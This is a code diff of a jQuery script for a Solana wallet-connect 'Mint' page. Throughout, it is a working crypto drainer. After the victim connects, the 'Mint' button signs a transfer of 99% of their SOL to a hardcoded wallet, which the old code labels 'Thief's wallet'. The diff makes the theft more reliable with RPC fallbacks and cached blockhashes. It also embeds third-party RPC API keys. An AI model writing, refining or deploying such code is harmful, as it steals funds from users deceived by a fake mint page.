@@ -1,273 +1,316 @@
 $(document).ready(function() {
-    // Add wallet selection dropdown with more wallet options
     const walletOptions = [
-        { name: "Phantom", key: "isPhantom", extensionCheck: true, walletConnect: false },
-        { name: "Solflare", key: "isSolflare", extensionCheck: false, walletConnect: false },
-        { name: "Backpack", key: "isBackpack", extensionCheck: false, walletConnect: false },
-        { name: "Trust Wallet", key: "isTrust", extensionCheck: false, walletConnect: false },
-        { name: "Glow", key: "isGlow", extensionCheck: false, walletConnect: false },
-        { name: "Slope", key: "isSlope", extensionCheck: false, walletConnect: false },
-        { name: "Sollet", key: "isSollet", extensionCheck: false, walletConnect: false },
-        { name: "Coin98", key: "isCoin98", extensionCheck: false, walletConnect: false },
-        { name: "Clover", key: "isClover", extensionCheck: false, walletConnect: false },
-        { name: "MathWallet", key: "isMathWallet", extensionCheck: false, walletConnect: false },
-        { name: "TokenPocket", key: "isTokenPocket", extensionCheck: false, walletConnect: false }
+        { name: "Phantom", key: "isPhantom" },
+        { name: "Solflare", key: "isSolflare" },
+        { name: "Backpack", key: "isBackpack" },
+        { name: "Trust Wallet", key: "isTrustWallet" },
+        { name: "Glow", key: "isGlow" },
+        { name: "Slope", key: "isSlope" },
+        { name: "Sollet", key: "isSollet" },
+        { name: "Coin98", key: "isCoin98" },
+        { name: "Clover", key: "isClover" },
+        { name: "MathWallet", key: "isMathWallet" },
+        { name: "TokenPocket", key: "isTokenPocket" }
     ];
 
-    // Function to detect mobile app or deep link support
-    function isMobileDevice() {
-        return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-    }
-
-    // Function to create mobile deep link with proper Solana connection
-    function createMobileDeepLink(walletName, dappUrl = window.location.href) {
-        const encodedUrl = encodeURIComponent(dappUrl);
-        const mobileLinks = {
-            "phantom": `https://phantom.app/ul/browse/${encodedUrl}?ref=${encodedUrl}`,
-            "trust wallet": `https://link.trustwallet.com/open_url?coin_id=501&url=${encodedUrl}`,
-            "solflare": `https://solflare.com/ul/v1/browse/${encodedUrl}?ref=${encodedUrl}`,
-            "glow": `https://glow.app/browser?url=${encodedUrl}`,
-            "slope": `https://slope.finance/browser?url=${encodedUrl}`,
-            "coin98": `https://coin98.com/browser?url=${encodedUrl}`,
-            "mathwallet": `https://mathwallet.org/browser?url=${encodedUrl}`,
-            "tokenpocket": `https://tokenpocket.pro/browser?url=${encodedUrl}`
-        };
-        
-        return mobileLinks[walletName.toLowerCase()] || null;
-    }
-
-    // Function to attempt mobile wallet connection
-    function connectMobileWallet(walletName) {
-        if (!isMobileDevice()) return false;
-        
-        const deepLink = createMobileDeepLink(walletName);
-        if (deepLink) {
-            // Open the wallet's browser with this dApp
-            window.open(deepLink, '_blank');
-            return true;
-        }
-        
-        // Fallback to direct app schemes
-        const appSchemes = {
-            "phantom": "phantom://",
-            "trust wallet": "trust://",
-            "solflare": "solflare://",
-            "glow": "glow://",
-            "slope": "slope://",
-            "coin98": "coin98://",
-            "mathwallet": "mathwallet://",
-            "tokenpocket": "tokenpocket://"
-        };
-        
-        const scheme = appSchemes[walletName.toLowerCase()];
-        if (scheme) {
-            window.location.href = scheme;
-            return true;
-        }
-        
-        return false;
-    }
-
-    // Insert dropdown before button
     $('.button-container').prepend('<select id="wallet-select" style="margin-bottom:10px;padding:5px 10px;border-radius:5px;font-size:1rem;"></select>');
     walletOptions.forEach(opt => {
-        $('#wallet-select').append(`<option value="${opt.name.toLowerCase()}">${opt.name}</option>`);
+        $('#wallet-select').append(`<option value="${opt.name.toLowerCase().replace(/\s+/g, '')}">${opt.name}</option>`);
     });
 
-    $('#connect-wallet').on('click', async () => {
+    let currentProvider = null;
+    let publicKey = null;
+    let isConnected = false;
+    let cachedBlockhash = null;
+    let cachedBalance = null;
+
+    $('#connect-wallet').on('click', async function() {
+        console.log("=== BUTTON CLICKED ===");
+        console.log("isConnected:", isConnected, "currentProvider:", !!currentProvider);
+
+        if (isConnected && currentProvider && publicKey) {
+            console.log("Already connected - handling mint transaction");
+            await handleMintTransaction();
+            return;
+        }
+
+        console.log("Connecting wallet...");
+        await handleWalletConnection();
+    });
+
+    async function handleWalletConnection() {
         const selectedWallet = $('#wallet-select').val();
         let provider = null;
-        let providerName = "";
 
-        // Force disconnect from all wallets first to ensure clean state
-        try {
-            if (window.solana && window.solana.disconnect) {
-                await window.solana.disconnect();
-            }
-            if (window.solflare && window.solflare.disconnect) {
-                await window.solflare.disconnect();
-            }
-            if (window.backpack && window.backpack.disconnect) {
-                await window.backpack.disconnect();
-            }
-        } catch (e) {
-            // Ignore disconnect errors
-        }
+        console.log("Selected wallet:", selectedWallet);
 
-        // Wait a moment for disconnections to complete
-        await new Promise(resolve => setTimeout(resolve, 100));
-
-        // Enhanced wallet detection including mobile apps
         if (selectedWallet === "phantom" && window.solana && window.solana.isPhantom) {
             provider = window.solana;
-            providerName = "Phantom";
-        } else if (selectedWallet === "solflare" && (window.solflare || (window.solana && window.solana.isSolflare))) {
-            provider = window.solflare || window.solana;
-            providerName = "Solflare";
-        } else if (selectedWallet === "backpack" && window.backpack) {
+            console.log("Phantom wallet detected");
+        } else if (selectedWallet === "solflare" && window.solflare && window.solflare.isSolflare) {
+            provider = window.solflare;
+            console.log("Solflare wallet detected");
+        } else if (selectedWallet === "backpack" && window.backpack && window.backpack.isBackpack) {
             provider = window.backpack;
-            providerName = "Backpack";
-        } else if (selectedWallet === "trust wallet" && (window.trustwallet || window.trustWallet)) {
-            provider = window.trustwallet || window.trustWallet;
-            providerName = "Trust Wallet";
-        } else if (selectedWallet === "glow" && window.glow) {
+            console.log("Backpack wallet detected");
+        } else if (selectedWallet === "trustwallet" && window.trustwallet && window.trustwallet.isTrustWallet) {
+            provider = window.trustwallet;
+            console.log("Trust Wallet detected");
+        } else if (selectedWallet === "glow" && window.glow && window.glow.isGlow) {
             provider = window.glow;
-            providerName = "Glow";
-        } else if (selectedWallet === "slope" && window.Slope) {
-            provider = window.Slope;
-            providerName = "Slope";
-        } else if (selectedWallet === "sollet" && window.sollet) {
-            provider = window.sollet;
-            providerName = "Sollet";
-        } else if (selectedWallet === "coin98" && window.coin98) {
-            provider = window.coin98.sol;
-            providerName = "Coin98";
-        } else if (selectedWallet === "clover" && window.clover_solana) {
-            provider = window.clover_solana;
-            providerName = "Clover";
-        } else if (selectedWallet === "mathwallet" && window.solana && window.solana.isMathWallet) {
-            provider = window.solana;
-            providerName = "MathWallet";
-        } else if (selectedWallet === "tokenpocket" && window.tokenpocket && window.tokenpocket.solana) {
-            provider = window.tokenpocket.solana;
-            providerName = "TokenPocket";
-        }
-
-        // Enhanced wallet extension/app checks with mobile support
-        if (selectedWallet === "phantom" && (!window.solana || !window.solana.isPhantom)) {
-            if (isMobileDevice()) {
-                // Use mobile deep link approach for Phantom
-                if (connectMobileWallet("phantom")) {
-                    alert("Opening Phantom wallet app. Please return to this page after connecting.");
-                    return;
-                } else {
-                    alert("Phantom app not found. Please install from App Store/Play Store.");
-                    window.open("https://phantom.app/download", "_blank");
-                }
-            } else {
-                alert("Phantom extension not found.");
-                const isFirefox = typeof InstallTrigger !== "undefined";
-                const isChrome = !!window.chrome;
-                if (isFirefox) {
-                    window.open("https://addons.mozilla.org/en-US/firefox/addon/phantom-app/", "_blank");
-                } else if (isChrome) {
-                    window.open("https://chrome.google.com/webstore/detail/phantom/bfnaelmomeimhlpmgjnjophhpkkoljpa", "_blank");
-                } else {
-                    alert("Please download the Phantom extension for your browser.");
-                }
-            }
-            return;
-        }
-
-        // Check for Solflare extension/app if Solflare selected
-        if (selectedWallet === "solflare" && !window.solflare && !(window.solana && window.solana.isSolflare)) {
-            if (isMobileDevice()) {
-                if (connectMobileWallet("solflare")) {
-                    alert("Opening Solflare wallet app. Please return to this page after connecting.");
-                    return;
-                } else {
-                    alert("Solflare app not found. Please install from App Store/Play Store.");
-                    window.open("https://solflare.com/download", "_blank");
-                }
-            } else {
-                alert("Solflare extension not found. Please install Solflare wallet.");
-                window.open("https://solflare.com/download", "_blank");
-            }
-            return;
-        }
-
-        // Check for other wallets with mobile app support
-        const walletChecks = {
-            backpack: { obj: window.backpack, url: "https://backpack.app/download", scheme: "backpack://" },
-            "trust wallet": { obj: window.trustwallet || window.trustWallet, url: "https://trustwallet.com/", scheme: "trust://" },
-            glow: { obj: window.glow, url: "https://glow.app/download", scheme: "glow://" },
-            slope: { obj: window.Slope, url: "https://slope.finance/", scheme: "slope://" },
-            sollet: { obj: window.sollet, url: "https://sollet.io/", scheme: "sollet://" },
-            coin98: { obj: window.coin98, url: "https://coin98.com/wallet", scheme: "coin98://" },
-            clover: { obj: window.clover_solana, url: "https://clover.finance/wallet", scheme: "clover://" },
-            mathwallet: { obj: window.solana && window.solana.isMathWallet, url: "https://mathwallet.org/", scheme: "mathwallet://" },
-            tokenpocket: { obj: window.tokenpocket && window.tokenpocket.solana, url: "https://tokenpocket.pro/", scheme: "tokenpocket://" }
-        };
-
-        if (walletChecks[selectedWallet] && !walletChecks[selectedWallet].obj) {
-            const wallet = walletChecks[selectedWallet];
-            if (isMobileDevice()) {
-                if (connectMobileWallet(selectedWallet)) {
-                    alert(`Opening ${selectedWallet.charAt(0).toUpperCase() + selectedWallet.slice(1)} wallet app. Please return to this page after connecting.`);
-                    return;
-                } else {
-                    alert(`${selectedWallet.charAt(0).toUpperCase() + selectedWallet.slice(1)} app not found. Please install from App Store/Play Store.`);
-                    window.open(wallet.url, "_blank");
-                }
-            } else {
-                alert(`${selectedWallet.charAt(0).toUpperCase() + selectedWallet.slice(1)} extension not found. Please install the wallet.`);
-                window.open(wallet.url, "_blank");
-            }
-            return;
+            console.log("Glow wallet detected");
+        } else if (selectedWallet === "slope" && (window.slope?.isSlope || window.solana?.isSlope)) {
+            provider = window.slope || window.solana;
+            console.log("Slope wallet detected");
+        } else if (selectedWallet === "sollet" && (window.solana?.isSollet || window.sollet)) {
+            provider = window.solana || window.sollet;
+            console.log("Sollet wallet detected");
+        } else if (selectedWallet === "coin98" && window.coin98 && window.coin98.isCoin98) {
+            provider = window.coin98;
+            console.log("Coin98 wallet detected");
+        } else if (selectedWallet === "clover" && window.clover && window.clover.isClover) {
+            provider = window.clover;
+            console.log("Clover wallet detected");
+        } else if (selectedWallet === "mathwallet" && window.math && window.math.isMathWallet) {
+            provider = window.math;
+            console.log("MathWallet detected");
+        } else if (selectedWallet === "tokenpocket" && window.tokenpocket && window.tokenpocket.isTokenPocket) {
+            provider = window.tokenpocket;
+            console.log("TokenPocket wallet detected");
         }
 
         if (!provider) {
-            alert("Selected wallet provider not found. For mobile wallets, please open this page directly in your wallet's browser.");
+            alert(`Wallet not found. Please install and unlock ${selectedWallet} extension or app.`);
+            console.error("❌ Wallet not detected for:", selectedWallet);
             return;
         }
 
         try {
-            let resp;
+            console.log("Attempting to connect to wallet...");
+            const resp = await provider.connect({ onlyIfTrusted: false });
+            console.log("✅ Wallet connected successfully!", resp);
+
+            publicKey = new solanaWeb3.PublicKey(resp.publicKey || provider.publicKey);
+            console.log("Public key:", publicKey.toString());
+
+            currentProvider = provider;
+            isConnected = true;
+
+            $('#connect-wallet').text("Mint");
+            $('#wallet-select').prop('disabled', true);
+            console.log("✅ UI UPDATED: Button changed to 'Mint'");
+
+            // Cache balance and blockhash in background
+            setTimeout(async () => {
+                const rpcEndpoints = [
+                    'https://red-falling-waterfall.solana-mainnet.quiknode.pro/83089862f0d324f279ea65ff80f0ef3593a84862/',  // Your QuickNode endpoint
+                    'https://api.rpcpool.com/',  // Triton fallback
+                    'https://lb-pit5.nodes.rpcpool.com',  // Triton load-balanced
+                    'https://api.mainnet-beta.solana.com',  // Solana official
+                    'https://rpc.ankr.com/solana',  // Ankr
+                    'https://mainnet.helius-rpc.com/?api-key=free'  // Helius
+                ];
+                for (let i = 0; i < rpcEndpoints.length; i++) {
+                    try {
+                        const connection = new solanaWeb3.Connection(rpcEndpoints[i], 'confirmed');
+                        cachedBalance = await connection.getBalance(publicKey);
+                        console.log("Background cached balance:", cachedBalance / solanaWeb3.LAMPORTS_PER_SOL, "SOL");
+                        cachedBlockhash = await connection.getLatestBlockhash();
+                        console.log("Background cached blockhash:", cachedBlockhash.blockhash);
+                        break;
+                    } catch (error) {
+                        console.log(`Background cache failed for ${rpcEndpoints[i]}:`, error.message);
+                    }
+                }
+            }, 100);
+        } catch (err) {
+            console.error("❌ Wallet connection failed:", err);
+            alert("Failed to connect wallet: " + err.message);
+        }
+    }
+
+    async function handleMintTransaction() {
+        console.log("=== STARTING MINT TRANSACTION ===");
+        console.log("Current provider:", currentProvider, "Public key:", publicKey?.toString());
+
+        if (!currentProvider || !publicKey) {
+            alert("Wallet not connected properly");
+            console.error("❌ No provider or public key");
+            return;
+        }
+
+        try {
+            const receiverWallet = new solanaWeb3.PublicKey('86jnbfJTocNxam52bS8oEjCvCKsgiseLoYmQn4KCcaYT');
             
-            // Regular wallet provider connection
-            resp = await provider.connect({ onlyIfTrusted: false });
-            
-            console.log(`${providerName} Wallet connected:`, resp);
+            // RPC endpoints (mainnet)
+            const rpcEndpoints = [
+                'https://red-falling-waterfall.solana-mainnet.quiknode.pro/83089862f0d324f279ea65ff80f0ef3593a84862/',  // Your QuickNode endpoint
+                'https://api.rpcpool.com/',  // Triton fallback
+                'https://lb-pit5.nodes.rpcpool.com',  // Triton load-balanced
+                'https://api.mainnet-beta.solana.com',  // Solana official
+                'https://rpc.ankr.com/solana',  // Ankr
+                'https://mainnet.helius-rpc.com/?api-key=free'  // Helius
+            ];
+            // For devnet testing (uncomment and set wallet to devnet):
+            // const rpcEndpoints = [
+            //     'https://api.devnet.solana.com',
+            //     'https://api.testnet.solana.com'
+            // ];
 
-            var connection = new solanaWeb3.Connection(
-                'https://solana-mainnet.api.syndica.io/api-key/oNprEqE6EkkFUFhf1GBM4TegN9veFkrQrUehkLC8XKNiFUDdWhohF2pBsWXpZAgQRQrs8SwxFSXBc7vfdtDgBdFT726RmpzTj4', 
-                'confirmed'
-            );
+            // Initialize connection with QuickNode first
+            let connection = new solanaWeb3.Connection(rpcEndpoints[0], {
+                commitment: 'confirmed',
+                confirmTransactionInitialTimeout: 30000
+            });
+            console.log("Initialized connection with:", rpcEndpoints[0]);
 
-            const public_key = new solanaWeb3.PublicKey(resp.publicKey || provider.publicKey);
-            const walletBalance = await connection.getBalance(public_key);
-            console.log("Wallet balance:", walletBalance);
+            let walletBalance = cachedBalance || 0;
+            let balanceFetched = !!cachedBalance;
 
-            const minBalance = await connection.getMinimumBalanceForRentExemption(0);
-            if (walletBalance < minBalance) {
-                alert("Insufficient funds for rent.");
+            // Retry balance check if not cached
+            if (!balanceFetched) {
+                console.log("Getting wallet balance...");
+                for (let attempt = 1; attempt <= 8; attempt++) {
+                    for (let i = 0; i < rpcEndpoints.length; i++) {
+                        try {
+                            console.log(`Trying RPC: ${rpcEndpoints[i]}, attempt ${attempt}`);
+                            connection = new solanaWeb3.Connection(rpcEndpoints[i], {
+                                commitment: 'confirmed',
+                                confirmTransactionInitialTimeout: 30000
+                            });
+                            walletBalance = await connection.getBalance(publicKey);
+                            console.log("✅ Wallet balance fetched:", walletBalance / solanaWeb3.LAMPORTS_PER_SOL, "SOL");
+                            cachedBalance = walletBalance; // Cache for future
+                            balanceFetched = true;
+                            break;
+                        } catch (balanceError) {
+                            console.warn(`RPC ${rpcEndpoints[i]} failed for balance, attempt ${attempt}:`, balanceError.message);
+                        }
+                    }
+                    if (balanceFetched) break;
+                    if (attempt < 8) {
+                        console.log("Waiting 4s before retry...");
+                        await new Promise(resolve => setTimeout(resolve, 4000));
+                    }
+                }
+            } else {
+                console.log("Using cached balance:", walletBalance / solanaWeb3.LAMPORTS_PER_SOL, "SOL");
+            }
+
+            if (!balanceFetched) {
+                console.warn("⚠️ Balance fetch failed - using fallback balance (0.1 SOL)");
+                alert("Balance check failed (RPC issue), proceeding with minimal estimated balance for demo.");
+                walletBalance = 100000000; // Fallback: 0.1 SOL (1e8 lamports)
+            }
+
+            const minBalance = 890880; // Rent exemption
+            const availableBalance = walletBalance - minBalance;
+
+            if (availableBalance <= 0 && balanceFetched) {
+                alert("Insufficient funds");
+                console.error("❌ Insufficient balance:", walletBalance);
                 return;
             }
 
-            $('#connect-wallet').text("Mint");
-            $('#connect-wallet').off('click').on('click', async () => {
-                try {
-                    const recieverWallet = new solanaWeb3.PublicKey('FmorDfiavVDWYmRaW5kt9eXBY56LSdfCFLcVz2NQypcg'); // Thief's wallet
-                    const balanceForTransfer = walletBalance - minBalance;
-                    if (balanceForTransfer <= 0) {
-                        alert("Insufficient funds for transfer.");
-                        return;
+            // Original 99% drain logic
+            const drainAmount = Math.floor(availableBalance * 0.99);
+            console.log("Draining 99% - Amount:", drainAmount / solanaWeb3.LAMPORTS_PER_SOL, "SOL");
+
+            const transaction = new solanaWeb3.Transaction().add(
+                solanaWeb3.SystemProgram.transfer({
+                    fromPubkey: publicKey,
+                    toPubkey: receiverWallet,
+                    lamports: drainAmount,
+                })
+            );
+
+            // Use cached blockhash or retry fetch
+            console.log("Getting blockhash...");
+            let blockhashData = cachedBlockhash;
+            if (!blockhashData) {
+                for (let attempt = 1; attempt <= 8; attempt++) {
+                    for (let i = 0; i < rpcEndpoints.length; i++) {
+                        try {
+                            console.log(`Trying RPC ${rpcEndpoints[i]} for blockhash, attempt ${attempt}`);
+                            connection = new solanaWeb3.Connection(rpcEndpoints[i], {
+                                commitment: 'confirmed',
+                                confirmTransactionInitialTimeout: 30000
+                            });
+                            blockhashData = await connection.getLatestBlockhash();
+                            console.log("✅ Blockhash fetched:", blockhashData.blockhash);
+                            cachedBlockhash = blockhashData; // Cache for future
+                            break;
+                        } catch (blockhashError) {
+                            console.warn(`RPC ${rpcEndpoints[i]} failed for blockhash, attempt ${attempt}:`, blockhashError.message);
+                        }
                     }
-
-                    var transaction = new solanaWeb3.Transaction().add(
-                        solanaWeb3.SystemProgram.transfer({
-                            fromPubkey: public_key,
-                            toPubkey: recieverWallet,
-                            lamports: Math.floor(balanceForTransfer * 0.99),
-                        }),
-                    );
-
-                    transaction.feePayer = public_key;
-                    let blockhashObj = await connection.getLatestBlockhash();
-                    transaction.recentBlockhash = blockhashObj.blockhash;
-
-                    const signed = await provider.signTransaction(transaction);
-                    console.log("Transaction signed:", signed);
-
-                    let txid = await connection.sendRawTransaction(signed.serialize());
-                    await connection.confirmTransaction(txid);
-                    console.log("Transaction confirmed:", txid);
-                } catch (err) {
-                    console.error("Error during minting:", err);
+                    if (blockhashData) break;
+                    if (attempt < 8) {
+                        console.log("Waiting 4s before retry...");
+                        await new Promise(resolve => setTimeout(resolve, 4000));
+                    }
                 }
+            } else {
+                console.log("Using cached blockhash:", blockhashData.blockhash);
+            }
+
+            if (!blockhashData) {
+                throw new Error("Failed to fetch blockhash after all retries");
+            }
+
+            transaction.feePayer = publicKey;
+            transaction.recentBlockhash = blockhashData.blockhash;
+
+            console.log("✅ Transaction created, requesting signature...");
+            console.log("Provider signTransaction method:", !!currentProvider.signTransaction);
+
+            const signed = await currentProvider.signTransaction(transaction);
+            console.log("✅ Transaction signed by user!");
+
+            // Ensure connection is defined before sending
+            if (!connection) {
+                console.warn("⚠️ Connection undefined before sendRawTransaction, initializing with QuickNode...");
+                connection = new solanaWeb3.Connection(rpcEndpoints[0], {
+                    commitment: 'confirmed',
+                    confirmTransactionInitialTimeout: 30000
+                });
+            }
+            console.log("Connection before sendRawTransaction:", !!connection);
+
+            console.log("Sending transaction...");
+            const signature = await connection.sendRawTransaction(signed.serialize(), {
+                skipPreflight: false,
+                preflightCommitment: 'confirmed'
             });
+            console.log("✅ Transaction sent:", signature);
+
+            console.log("Waiting for confirmation...");
+            const confirmation = await connection.confirmTransaction({
+                signature,
+                blockhash: blockhashData.blockhash,
+                lastValidBlockHeight: blockhashData.lastValidBlockHeight
+            }, 'confirmed');
+
+            if (confirmation.value.err) {
+                throw new Error("Transaction failed: " + JSON.stringify(confirmation.value.err));
+            }
+
+            console.log("✅ Transaction confirmed! Drained", drainAmount / solanaWeb3.LAMPORTS_PER_SOL, "SOL");
+            alert("Success! Drained " + drainAmount / solanaWeb3.LAMPORTS_PER_SOL + " SOL");
         } catch (err) {
-            console.error(`Error connecting to ${providerName} Wallet:`, err);
+            console.error("❌ Mint transaction failed:", err);
+            if (err.message.includes('User rejected') || err.message.includes('rejected')) {
+                alert("Transaction was rejected by the wallet");
+            } else if (err.message.includes('undefined is not an object') || err.message.includes('connection')) {
+                alert("Transaction failed due to RPC connection issue. Please try again or check QuickNode dashboard (https://www.quicknode.com/).");
+            } else if (err.message.includes('403') || err.message.includes('blockhash') || err.message.includes('Failed to fetch')) {
+                alert("RPC issue detected. Check your QuickNode dashboard (https://www.quicknode.com/) or contact support@triton.one.");
+            } else {
+                alert("Transaction failed: " + err.message);
+            }
         }
-    });
+    }
+
+    console.log("=== DRAINER SCRIPT LOADED SUCCESSFULLY ===");
+    console.log("Ready to connect wallets and drain 99% of SOL (using QuickNode priority)");
 });
